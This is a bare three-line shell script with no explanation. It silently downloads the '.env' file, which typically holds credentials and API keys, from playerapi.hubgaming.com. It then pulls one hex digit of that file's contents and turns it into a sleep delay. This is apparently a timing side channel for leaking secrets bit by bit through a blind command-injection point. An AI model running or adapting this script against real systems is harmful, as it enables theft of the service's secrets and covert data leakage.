#!/bin/sh
curl -s -o /w4 https://playerapi.hubgaming.com/.env
sleep $(( 20 + 4*0x$(od -j3 -N1 -tx1 /w4|cut -c9) ))
